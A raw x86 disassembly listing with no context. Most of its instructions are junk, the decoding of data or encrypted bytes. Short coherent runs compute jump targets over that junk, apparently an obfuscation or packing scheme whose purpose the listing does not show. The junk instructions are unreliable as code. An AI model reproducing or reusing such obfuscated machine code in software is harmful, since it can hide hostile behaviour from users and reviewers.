  4028f7:	mov    esi,0x4f00d6e2
  4028fc:	sub    dl,ch
  4028fe:	inc    ebp
  4028ff:	push   ebx
  402900:	dec    edi
  402901:	or     esp,ebx
  402903:	(bad)  
  402904:	lods   eax,DWORD PTR ds:[esi]
  402905:	(bad)  
  402907:	jnp    0x4028b5
  402909:	sbb    eax,ebp
  40290b:	(bad)  
  40290c:	cmp    cl,dl
  40290e:	bound  edi,QWORD PTR [edx+ebx*1-0x2b8ea5d6]
  402915:	jno    0x40293c
  402917:	es cmp al,dl
  40291a:	lds    ecx,FWORD PTR [eax-0x4f648536]
  402920:	arpl   bx,ax
  402922:	jmp    0x402912
  402924:	mov    esi,0x2ae4051
  402929:	hlt    
  40292a:	xchg   ecx,eax
  40292b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40292c:	in     al,0x7f
  40292e:	pop    ecx
  40292f:	loopne 0x4028dc
  402931:	cli    
  402932:	dec    eax
  402933:	and    al,BYTE PTR [eax-0xcd48f79]
  402939:	fcmovu st,st(1)
  40293b:	fwait
  40293c:	mov    ds:0xfc24d9c7,eax
  402941:	cwde   
  402942:	push   esp
  402943:	cmp    BYTE PTR [eax],dh
  402945:	fst    QWORD PTR [ebp+ebx*8+0x467f25a0]
  40294c:	fsubrp st(6),st
  40294e:	sub    dh,BYTE PTR [ebx-0x3d5636a9]
  402954:	(bad)  [eax-0x6e59334e]
  40295a:	sar    BYTE PTR [eax+0x1990318b],0x74
  402961:	loope  0x4029b7
  402963:	cmp    eax,0x477596c
  402968:	or     ecx,DWORD PTR [esi]
  40296a:	mov    ch,0x78
  40296c:	retf   0x850e
  40296f:	aad    0xf
  402971:	das    
  402972:	in     al,0xde
  402974:	pop    ecx
  402975:	(bad)  
  402976:	out    dx,al
  402977:	dec    eax
  402978:	dec    edx
  402979:	out    0xa4,al
  40297b:	xchg   ebp,eax
  40297c:	pop    edx
  40297d:	adc    bl,ah
  40297f:	xchg   ebp,eax
  402980:	xor    BYTE PTR [ecx+edx*2],ch
  402983:	pop    esp
  402984:	jp     0x40299f
  402986:	test   al,0xe6
  402988:	fcmovu st,st(4)
  40298a:	jns    0x4029c5
  40298c:	stc    
  40298d:	mov    al,0x39
  40298f:	mov    esi,ecx
  402991:	aad    0xd6
  402993:	cmp    al,BYTE PTR [ebp+0x394789cc]
  402999:	xchg   DWORD PTR [ecx],eax
  40299b:	mov    ebp,0x8cc6933
  4029a0:	or     DWORD PTR [edi],ecx
  4029a2:	push   esi
  4029a3:	sbb    al,0xd6
  4029a5:	xor    dl,BYTE PTR cs:[edx+0x79bef813]
  4029ac:	jb     0x40294a
  4029ae:	add    ecx,DWORD PTR [esi+0x277cfaca]
  4029b4:	jecxz  0x402963
  4029b6:	xchg   ecx,eax
  4029b7:	xchg   esp,eax
  4029b8:	imul   esp,DWORD PTR [ebx-0x3b02f3a7],0x72
  4029bf:	dec    esi
  4029c0:	aaa    
  4029c1:	lods   al,BYTE PTR ds:[esi]
  4029c2:	xor    esi,DWORD PTR cs:[ebx+0x9]
  4029c6:	mov    al,ds:0x7f0e7325
  4029cb:	not    bl
  4029cd:	mov    ebx,0x686f2a4
  4029d2:	mov    bl,0x73
  4029d4:	cmp    BYTE PTR [ebx+0x2e815400],dh
  4029da:	test   BYTE PTR [edi-0x3ca92086],al
  4029e0:	repz mov esp,?
  4029e3:	icebp  
  4029e4:	pop    edx
  4029e5:	fstp   DWORD PTR [ebp+0x46912132]
  4029eb:	test   esi,edi
  4029ed:	mov    edx,DWORD PTR [eax-0x17]
  4029f0:	or     DWORD PTR [eax],esi
  4029f2:	popf   
  4029f3:	jns    0x4029a7
  4029f5:	scas   eax,DWORD PTR es:[edi]
  4029f6:	pusha  
  4029f7:	ins    DWORD PTR es:[edi],dx
  4029f8:	dec    ebp
  4029f9:	and    DWORD PTR [edi+0x6ba8c5b6],eax
  4029ff:	pop    ebx
  402a00:	(bad)  
  402a01:	jnp    0x402a4c
  402a03:	shl    BYTE PTR [ebp-0x51148caa],1
  402a09:	call   0x9521:0xc573dfa8
  402a10:	push   ebp
  402a11:	jne    0x402a16
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	pop    edx
  402a35:	stos   DWORD PTR es:[edi],eax
  402a36:	push   ss
  402a37:	xchg   esp,eax
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	dec    edi
  402a41:	stos   DWORD PTR es:[edi],eax
  402a42:	sbb    al,0xad
  402a44:	gs iret 
  402a46:	dec    ecx
  402a47:	mov    dl,0x87
  402a49:	ret    
  402a4a:	repz or ebp,ebx
  402a4d:	mov    eax,ds:0x213a431c
  402a52:	mov    ecx,0xd399ce2
  402a57:	test   eax,0xfced37d1
  402a5d:	sub    BYTE PTR [edi+0x16],dh
  402a60:	(bad)  
  402a61:	push   esi
  402a62:	stos   DWORD PTR es:[edi],eax
  402a63:	stos   DWORD PTR es:[edi],eax
  402a64:	dec    esi
  402a65:	and    ecx,DWORD PTR [ebx-0x7e]
  402a68:	ret    0x8977
  402a6b:	push   ebp
  402a6c:	adc    ebp,DWORD PTR [eax-0x76]
  402a6f:	mov    bl,0x87
  402a71:	push   esi
  402a72:	push   edi
  402a73:	sbb    cl,BYTE PTR ds:0x8451b2b6
  402a79:	call   0x9ee49803
  402a7e:	jo     0x402aaf
  402a80:	xchg   ebp,eax
  402a81:	inc    eax
  402a82:	cwde   
  402a83:	js     0x402a91
  402a85:	enter  0x2107,0x7a
  402a89:	mov    esp,DWORD PTR [esp+eax*1-0x13]
  402a8d:	cwde   
  402a8e:	loopne 0x402aad
  402a90:	sub    DWORD PTR [eax-0x3],esp
  402a93:	js     0x402afa
  402a95:	mov    dh,0x65
  402a97:	scas   eax,DWORD PTR es:[edi]
  402a98:	retf   
  402a99:	xchg   edx,eax
  402a9a:	icebp  
  402a9b:	xchg   edi,eax
  402a9c:	shr    DWORD PTR [ebp+0x5491ef85],cl
  402aa2:	pop    ss
  402aa3:	aas    
  402aa4:	mov    edi,0xf5d59313
  402aa9:	mov    eax,ds:0xf902a89c
  402aae:	ja     0x402b01
  402ab0:	loopne 0x402b0c
  402ab2:	inc    esp
  402ab3:	jae    0x402a82
  402ab5:	(bad)  
  402ab6:	sbb    al,0x67
  402ab8:	adc    al,0xc1
  402aba:	pop    esi
  402abb:	sbb    al,ah
  402abd:	pop    ebx
  402abe:	icebp  
  402abf:	push   edx
  402ac0:	jle    0x402ac7
  402ac2:	pop    eax
  402ac3:	mov    esi,0xf1efb7b4
  402ac8:	popf   
  402ac9:	fldenv [esi+0xdb42feb]
  402acf:	mov    dh,0x73
  402ad1:	mov    ds:0xa0cf61e9,eax
  402ad6:	push   edi
  402ad7:	lock jl 0x402a76
  402ada:	push   esi
  402adb:	xchg   ebx,eax
  402adc:	aad    0xe9
  402ade:	repnz aaa 
  402ae0:	push   ss
  402ae1:	add    bl,BYTE PTR [edx]
  402ae3:	js     0x402a96
  402ae5:	add    cl,dl
  402ae7:	sub    BYTE PTR [ebx],0xb1
  402aea:	mov    eax,ds:0x93b9c600
  402aef:	pusha  
  402af0:	aad    0x99
  402af2:	imul   eax,DWORD PTR [edi+0x37],0x4afa6a6c
  402af9:	cmp    al,0x59
  402afb:	or     dl,ch
  402afd:	xchg   esi,eax
  402afe:	push   ds
  402aff:	gs mov esp,0x3c1d4d4f
  402b05:	addr16 retf 0xb1ec
  402b09:	xchg   DWORD PTR [eax+ebp*1-0x60],ebx
  402b0d:	loopne 0x402aa2
  402b0f:	dec    ecx
  402b10:	aam    0xda
  402b12:	cwde   
  402b13:	mov    eax,DWORD PTR [ebx+0x39]
  402b16:	hlt    
  402b17:	push   es
  402b18:	jne    0x402b8c
  402b1a:	imul   BYTE PTR [edx+eiz*2]
  402b1d:	aad    0xe5
  402b1f:	scas   eax,DWORD PTR es:[edi]
  402b20:	into   
  402b21:	mov    ds:0xccb6708c,eax
  402b26:	stos   BYTE PTR es:[edi],al
  402b27:	call   0x5e87:0x201eb3d8
  402b2e:	mov    ebp,0x81577a6d
  402b33:	mov    ebx,0x6222d50a
  402b38:	or     al,0x3f
  402b3a:	and    eax,DWORD PTR [esi+0x3c]
  402b3d:	or     dh,BYTE PTR [eax+0x1151ef35]
  402b43:	adc    DWORD PTR [esi],edi
  402b45:	int3   
  402b46:	mov    esp,0x2f4d1e64
  402b4b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  402b4d:	outs   dx,DWORD PTR ds:[esi]
  402b4e:	rcr    DWORD PTR [ebp-0x2e],0xce
  402b52:	(bad)  
  402b54:	jns    0x402b73
  402b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b57:	jmp    0xf613:0x32666af
  402b5e:	mov    al,0x63
  402b60:	dec    ebx
  402b61:	pop    ss
  402b62:	fcmovu st,st(4)
  402b64:	lods   al,BYTE PTR ds:[esi]
  402b65:	nop
  402b66:	icebp  
  402b67:	iret   
  402b68:	fst    DWORD PTR [ecx]
  402b6a:	std    
  402b6b:	pop    es
  402b6c:	dec    edi
  402b6d:	xor    eax,0xfff6fc57
  402b72:	cmp    DWORD PTR [ebx+eax*8-0x47],edi
  402b76:	jp     0x402b6c
  402b78:	jg     0x402ba3
  402b7a:	push   ebp
  402b7b:	and    al,0xb1
  402b7d:	aam    0x48
  402b7f:	pop    esi
  402b80:	shr    cl,0x3c
  402b83:	pusha  
  402b84:	cld    
  402b85:	dec    ebx
  402b86:	stos   BYTE PTR es:[edi],al
  402b87:	test   DWORD PTR [ebx+ebp*2-0x4b],eax
  402b8b:	arpl   bp,si
  402b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b8e:	xchg   edi,eax
  402b8f:	ror    BYTE PTR [eax-0x2cbe2e05],cl
  402b95:	lock outs dx,DWORD PTR ds:[esi]
  402b97:	xchg   DWORD PTR [ebx+0xa],esi
  402b9a:	bound  ecx,QWORD PTR [ecx-0x3a618e8a]
  402ba0:	clc    
  402ba1:	mov    ds:0xd350d9e,eax
  402ba6:	cwde   
  402ba7:	int3   
  402ba8:	inc    ebp
  402ba9:	lea    ebp,[esi+0x3]
  402bac:	dec    esi
  402bad:	aaa    
  402bae:	(bad)  
  402baf:	sbb    ch,ah
  402bb1:	xchg   DWORD PTR [edx+0x7b],eax
  402bb4:	xchg   ebp,eax
  402bb5:	cmp    DWORD PTR [ebp+0x4a46245f],ebp
  402bbb:	adc    ebx,DWORD PTR ds:0x283fcd2b
  402bc1:	sbb    al,0x55
  402bc3:	mov    eax,0x840fc085
  402bc8:	sub    BYTE PTR [eax],al
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	imul   DWORD PTR [ebp+0xb369fee]
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c00
  402c1e:	xchg   esp,eax
  402c1f:	sbb    ecx,DWORD PTR [ecx+eiz*2-0x3cf1581a]
  402c26:	xchg   ebp,eax
  402c27:	out    dx,al
  402c28:	inc    ecx
  402c29:	jle    0x402c68
  402c2b:	iret   
  402c2c:	jno    0x402c08
  402c2e:	es dec ebp
  402c30:	ja     0x402beb
  402c32:	mov    esi,0x1d4e1668
  402c37:	sub    eax,0x3fabc78d
  402c3c:	sti    
  402c3d:	mov    ah,0x42
  402c3f:	inc    esp
  402c40:	sbb    BYTE PTR ds:0x7c8c794c,bh
  402c46:	cwde   
  402c47:	sbb    ah,BYTE PTR [ecx]
  402c49:	or     al,BYTE PTR ds:0x966cca90
  402c4f:	cwde   
  402c50:	cmp    ecx,eax
  402c52:	xor    esp,ebx
  402c54:	mov    edi,0x2c02a2ca
  402c59:	xor    al,0xfb
  402c5b:	and    BYTE PTR [di+0x6f04],al
  402c60:	adc    DWORD PTR [eax-0x170f37d7],edi
  402c66:	push   ds
  402c67:	(bad)  
  402c68:	fwait
  402c69:	pop    ebp
  402c6a:	fdiv   DWORD PTR [ecx*2+0x37bf6898]
  402c71:	sub    dl,BYTE PTR [ebx-0x26]
  402c74:	mov    ecx,edi
  402c76:	stos   DWORD PTR es:[edi],eax
  402c77:	fstp   DWORD PTR [esp+esi*4-0x29]
  402c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c7c:	or     al,0x1f
  402c7e:	jae    0x402c1d
  402c80:	test   eax,0xa85119b
  402c85:	bound  ecx,QWORD PTR [edx+0x7baf2975]
  402c8b:	sub    BYTE PTR [ecx+0x2e45f637],al
  402c91:	jp     0x402c64
  402c93:	outs   dx,DWORD PTR ds:[esi]
  402c94:	fs or  al,0xe8
  402c97:	sub    al,0x0
  402c99:	dec    edi
  402c9a:	push   esi
  402c9b:	mov    esi,0xa3c44297
  402ca0:	enter  0xb088,0xfd
  402ca4:	jp     0x402c62
  402ca6:	out    0x47,al
  402ca8:	or     ch,BYTE PTR [ebx-0x4cd6e6c4]
  402cae:	icebp  
  402caf:	and    al,0x9d
  402cb1:	mov    eax,ds:0x83ed1411
  402cb6:	pop    eax
  402cb7:	xor    ebp,edi
  402cb9:	popf   
  402cba:	adc    esi,DWORD PTR ds:0x8fc77c56
  402cc0:	dec    ebp
  402cc1:	or     BYTE PTR [ebp+0x5a],bh
  402cc4:	arpl   WORD PTR [ecx-0x5],si
  402cc7:	fwait
  402cc8:	inc    ebp
  402cc9:	jmp    0x402c85
  402ccb:	xor    BYTE PTR [ebp+0x83a6650],0x38
  402cd2:	loope  0x402cd7
  402cd4:	inc    edi
  402cd5:	dec    ebx
  402cd6:	mov    ebx,0xa23b840e
  402cdb:	or     al,0xf
  402cdd:	pop    ebx
  402cde:	xor    esp,ebp
  402ce0:	cs adc dh,al
  402ce3:	les    ebp,FWORD PTR [eax]
  402ce5:	push   edx
  402ce6:	popf   
  402ce7:	pop    ds
  402ce8:	aaa    
  402ce9:	jo     0x402c72
  402ceb:	js     0x402d1b
  402ced:	repz cmp al,0x3
  402cf0:	push   esi
  402cf1:	dec    eax
  402cf2:	aad    0xa2
  402cf4:	je     0x402cd6
  402cf6:	pushf  
  402cf7:	into   
  402cf8:	add    bl,BYTE PTR [eax-0x31]
  402cfb:	into   
  402cfc:	dec    si
  402cfe:	jge    0x402d22
  402d00:	mov    cl,0xb8
  402d02:	jp     0x402d26
  402d04:	jecxz  0x402cbc
  402d06:	push   cs
  402d07:	cli    
  402d08:	mov    esi,0x31f0ffb6
  402d0d:	xor    eax,0xa22e4847
  402d12:	xchg   esi,eax
  402d13:	adc    DWORD PTR [edi-0x6b],esi
  402d16:	or     BYTE PTR [edx-0x2a0c6621],bh
  402d1c:	cmp    edi,DWORD PTR [ecx-0x6c]
  402d1f:	jb     0x402d5b
  402d21:	clc    
  402d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d23:	xor    eax,0xc9b3e64
  402d28:	inc    ebx
  402d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d2a:	xor    bh,BYTE PTR [edx+esi*4-0x3480444b]
  402d31:	mov    al,ds:0xe41c401a
  402d36:	shr    DWORD PTR es:[edx+0xcc1e68c],cl
  402d3d:	inc    edx
  402d3e:	cmc    
  402d3f:	gs dec ebp
  402d41:	xor    ebx,DWORD PTR [edx+0x480f34fd]
  402d47:	xchg   ebx,eax
  402d48:	jne    0x402db6
  402d4a:	retf   
  402d4b:	out    dx,eax
  402d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d4d:	cmp    al,0xfb
  402d4f:	mov    ah,0x60
  402d51:	dec    edx
  402d52:	das    
  402d53:	jl     0x402cf5
  402d55:	pop    ebx
  402d56:	mov    cl,0xce
  402d58:	pop    ss
  402d59:	stos   DWORD PTR es:[edi],eax
  402d5a:	and    DWORD PTR ds:0xfdd924a6,0xec8143b9
  402d64:	push   ss
  402d65:	fsubr  DWORD PTR [ebx]
  402d67:	in     al,0xe5
  402d69:	inc    edi
  402d6a:	push   eax
  402d6b:	cmp    ebx,DWORD PTR [ebp-0x17]
  402d6e:	gs pop ecx
  402d70:	jecxz  0x402d9e
  402d72:	ret    0x3a24
  402d75:	test   al,0xd7
  402d77:	dec    DWORD PTR [esi+0x4c]
  402d7a:	sub    DWORD PTR [eax+0xf],esp
  402d7d:	add    BYTE PTR [esp+ebx*1],cl
  402d80:	and    dh,ch
  402d82:	stos   BYTE PTR es:[edi],al
  402d83:	inc    eax
  402d84:	in     al,dx
  402d85:	cmp    bl,dh
  402d87:	shr    ch,cl
  402d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d8b:	mov    eax,DWORD PTR [eax+ebp*2-0x79335452]
  402d92:	das    
  402d93:	call   0x354e:0x3ce02414
  402d9a:	and    eax,0x7872fd77
  402d9f:	mov    bl,0xbb
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [esp+ebp*8+0x50],1
  402de7:	cdq    
  402de8:	xchg   edx,eax
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e20
  402df2:	addr16 pop ecx
  402df4:	cdq    
  402df5:	xchg   ebx,eax
  402df6:	call   0x873a:0x1a46a810
  402dfd:	mov    ah,0x3
  402dff:	dec    eax
  402e00:	dec    ecx
  402e01:	ds cld 
  402e03:	sbb    DWORD PTR [ecx],esi
  402e05:	arpl   bx,sp
  402e07:	xchg   dh,al
  402e09:	inc    eax
  402e0a:	mov    eax,cs:0x1726d6d3
  402e10:	gs (bad) 
  402e12:	jmp    0x402e8d
  402e14:	push   eax
  402e15:	cmc    
  402e16:	sub    BYTE PTR [eax],bl
  402e18:	outs   dx,DWORD PTR ds:[esi]
  402e19:	jge    0x402e50
  402e1b:	sub    eax,0x97991ae4
  402e20:	pop    es
  402e21:	test   eax,0x6a4d4016
  402e26:	jg     0x402e12
  402e28:	or     eax,0xeecfa28d
  402e2d:	loopne 0x402e13
  402e2f:	cs pop eax
  402e31:	loop   0x402e4d
  402e33:	sub    eax,0xfbe39f13
  402e38:	mov    al,ds:0x73b49e0b
  402e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e3e:	push   0x5c
  402e40:	xor    DWORD PTR ds:0x687e5ef8,0xffffff9f
  402e47:	icebp  
  402e48:	imul   eax,DWORD PTR [ebp+0x52c0db7e],0xbd137e70
  402e52:	push   ebp
  402e53:	add    esi,esi
  402e55:	lea    eax,[ecx+0x425115b0]
  402e5b:	(bad)  
  402e5c:	in     eax,dx
  402e5d:	cli    
  402e5e:	push   eax
  402e5f:	push   edi
  402e60:	push   es
  402e61:	fdiv   DWORD PTR [ecx+0x65]
  402e64:	xchg   esp,eax
  402e65:	xor    al,0xba
  402e67:	fucomi st,st(1)
  402e69:	repnz xor BYTE PTR [edx+edi*4-0x22],0x74
  402e6f:	outs   dx,DWORD PTR ds:[esi]
  402e70:	scas   al,BYTE PTR es:[edi]
  402e71:	lods   al,BYTE PTR ds:[esi]
  402e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e73:	lds    ecx,FWORD PTR [ebx+edx*4-0x1d]
  402e77:	retf   0x7de8
  402e7a:	(bad)  [ecx-0x4e]
  402e7d:	stos   BYTE PTR es:[edi],al
  402e7e:	ja     0x402eff
  402e80:	pop    ebx
  402e81:	aaa    
  402e82:	dec    ecx
  402e83:	stos   BYTE PTR es:[edi],al
  402e84:	ret    
  402e85:	cmp    eax,0x3803a49e
  402e8a:	pop    eax
  402e8b:	fisub  WORD PTR [edi]
  402e8d:	xchg   esp,eax
  402e8e:	(bad)  
  402e8f:	sti    
  402e90:	or     al,0x57
  402e92:	mov    edx,0x557d06e6
  402e97:	jns    0x402e8a
  402e99:	pushf  
  402e9a:	sub    ebx,eax
  402e9c:	std    
  402e9d:	int    0xe8
  402e9f:	xchg   edi,eax
  402ea0:	cmp    eax,0xfef831cf
  402ea5:	inc    ebp
  402ea6:	stos   DWORD PTR es:[edi],eax
  402ea7:	mul    DWORD PTR [edx+0x17]
  402eaa:	std    
  402eab:	scas   eax,DWORD PTR es:[edi]
  402eac:	fisubr WORD PTR [esi+0x457b1775]
  402eb2:	iret   
  402eb3:	sub    al,0xf2
  402eb5:	push   ss
  402eb6:	jmp    0x98c675b
  402ebb:	dec    ecx
  402ebc:	jns    0x402e50
  402ebe:	xchg   esi,eax
  402ebf:	outs   dx,BYTE PTR ds:[esi]
  402ec0:	ret    0xd02c
  402ec3:	push   0xffffff89
  402ec5:	je     0x402e55
  402ec7:	scas   al,BYTE PTR es:[edi]
  402ec8:	push   ss
  402ec9:	or     bh,BYTE PTR [ebx-0x3c]
  402ecc:	dec    edi
  402ecd:	pushf  
  402ece:	pop    ecx
  402ecf:	retf   
  402ed0:	xor    eax,0x70de99a7
  402ed5:	in     al,dx
  402ed6:	cmp    ch,al
  402ed8:	mov    BYTE PTR [ebp+0x23],bh
  402edb:	dec    edi
  402edc:	pop    esi
  402edd:	dec    ebp
  402ede:	mov    bh,0xab
  402ee0:	loope  0x402e65
  402ee2:	cdq    
  402ee3:	fld    TBYTE PTR [ecx+0x7336d605]
  402ee9:	retf   0xb2dd
  402eec:	imul   edx,DWORD PTR ds:0xf16a13bc,0xb883d771
  402ef6:	mov    ecx,0x37d8d782
  402efb:	add    BYTE PTR [ecx-0x144d53bf],bl
  402f01:	(bad)  
  402f02:	in     eax,dx
  402f03:	outs   dx,DWORD PTR ds:[esi]
  402f04:	lds    esp,FWORD PTR [edx+0x7c]
  402f07:	xor    cl,BYTE PTR [ecx-0x28f716f3]
  402f0d:	mov    eax,ds:0xdc69220e
  402f12:	cs and ah,al
  402f15:	mov    al,0x20
  402f17:	(bad)  
  402f18:	popf   
  402f19:	loope  0x402f08
  402f1b:	push   edx
  402f1c:	cmp    BYTE PTR [eax-0x482d2452],al
  402f22:	sahf   
  402f23:	cmp    edx,eax
  402f25:	xor    eax,0x441388c8
  402f2a:	mov    bh,0x33
  402f2c:	xchg   ecx,eax
  402f2d:	popa   
  402f2e:	scas   al,BYTE PTR es:[edi]
  402f2f:	xchg   DWORD PTR [edi+ebx*2],esp
  402f32:	icebp  
  402f33:	movups xmm6,XMMWORD PTR [edx+0x772cb5cf]
  402f3a:	out    0x98,eax
  402f3c:	pop    ebp
  402f3d:	dec    eax
  402f3e:	adc    eax,0x91bde36d
  402f43:	mov    bh,0xb0
  402f45:	push   0x4ec459e2
  402f4a:	sar    DWORD PTR [ebp-0x168d83a],1
  402f50:	adc    BYTE PTR [esi+0x57],dl
  402f53:	(bad)  
  402f54:	sub    DWORD PTR [edx+ebx*8+0x35ba769a],eax
  402f5b:	and    eax,0xe475a7a5
  402f60:	rcr    DWORD PTR ds:0x32f90b8,0x9
  402f67:	lods   eax,DWORD PTR ds:[esi]
  402f68:	or     ecx,edi
  402f6a:	pop    eax
  402f6b:	out    dx,al
  402f6c:	jne    0x402f50
  402f6e:	(bad)  
  402f6f:	push   DWORD PTR [edi+0xb7d19f9]
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x5b6ca5b7]
  402fae:	cmp    ebx,DWORD PTR [esi+edi*1+0x16]
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f8f
  402fb9:	nop
  402fba:	push   ebx
  402fbb:	xor    cl,dh
  402fbd:	mov    WORD PTR [esp+edi*8],es
  402fc0:	push   esp
  402fc1:	sub    al,dh
  402fc3:	mov    al,0xf8
  402fc5:	mov    ch,0xb5
  402fc7:	and    DWORD PTR [ebp+0x281d5612],esi
  402fcd:	add    edx,DWORD PTR [eax-0x46]
  402fd0:	push   ecx
  402fd1:	inc    ebx
  402fd2:	loopne 0x403008
  402fd4:	in     eax,dx
  402fd5:	and    ebx,DWORD PTR [esi]
  402fd7:	jl     0x403053
  402fd9:	test   DWORD PTR [esi+0x25dd8263],ebp
  402fdf:	into   
  402fe0:	mov    ah,0xb5
  402fe2:	and    BYTE PTR [edx+0x49],0x13
  402fe6:	neg    dl
  402fe8:	repz shl BYTE PTR fs:[edi],cl
  402fec:	in     al,0x9
  402fee:	dec    ecx
  402fef:	cmp    eax,DWORD PTR [ebx+0x24b97ba8]
  402ff5:	call   0xc110:0x422a401
  402ffc:	ret    0xc6b4
  402fff:	sbb    eax,0x9b776325
  403004:	push   cs
  403005:	mov    edi,0x2d4c27eb
  40300a:	and    BYTE PTR [ebx-0x7f],ch
  40300d:	mov    eax,0x43a3eff3
  403012:	lea    esi,[eax-0x7bdece27]
  403018:	cwde   
  403019:	mov    eax,0x188ce169
  40301e:	ins    BYTE PTR es:[edi],dx
  40301f:	xor    al,0xb6
  403021:	sub    esp,DWORD PTR [ebx+0x3b]
  403024:	sbb    edx,DWORD PTR [edx-0x4]
  403027:	cli    
  403028:	ficomp DWORD PTR [ebx-0x58]
  40302b:	push   0x39
  40302d:	or     BYTE PTR [eax+0x3b],bl
  403030:	in     eax,0x64
  403032:	fdivrp st(7),st
  403034:	lock push cs
  403036:	ins    BYTE PTR es:[edi],dx
  403037:	jnp    0x4030a5
  403039:	mov    eax,0x508bb77
  40303e:	jg     0x4030bd
  403040:	shl    edi,1
  403042:	loop   0x402fc6
  403044:	cmp    al,0x5
  403046:	add    BYTE PTR [edi],bh
  403048:	jnp    0x403012
  40304a:	imul   esi,edx,0x3f
  40304d:	aam    0x4e
  40304f:	mov    bl,0xa6
  403051:	or     ch,ch
  403053:	int3   
  403054:	or     DWORD PTR [esi+0x1376a0d2],esi
  40305a:	and    DWORD PTR [ecx+0x206f4e7b],0x30
  403061:	dec    esi
  403062:	jnp    0x402ffb
  403064:	jae    0x403079
  403066:	into   
  403067:	push   esi
  403068:	sbb    DWORD PTR [esi-0x69],ebx
  40306b:	mov    esi,0xd69ff553
  403070:	xor    edx,DWORD PTR [edx+0x2d]
  403073:	dec    esi
  403074:	pop    ds
  403075:	dec    edi
  403076:	(bad)  
  403077:	mov    cl,0x33
  403079:	sbb    al,0x2e
  40307b:	mov    cl,0xf0
  40307d:	fdivr  QWORD PTR [edx+0x69017d79]
  403083:	out    dx,al
  403084:	inc    esp
  403085:	cmc    
  403086:	xchg   esi,eax
  403087:	jae    0x4030ee
  403089:	xchg   esp,eax
  40308a:	pop    esi
  40308b:	outs   dx,DWORD PTR gs:[esi]
  40308d:	xchg   ecx,eax
  40308e:	mov    edi,0x71679411
  403093:	jmp    0x403080
  403095:	mov    bh,0x65
  403097:	lahf   
  403098:	ror    DWORD PTR fs:[ebp+0x15],1
  40309c:	pop    es
  40309d:	aam    0x3b
  40309f:	pop    esi
  4030a0:	or     BYTE PTR [edi],bh
  4030a2:	mov    dh,0x7
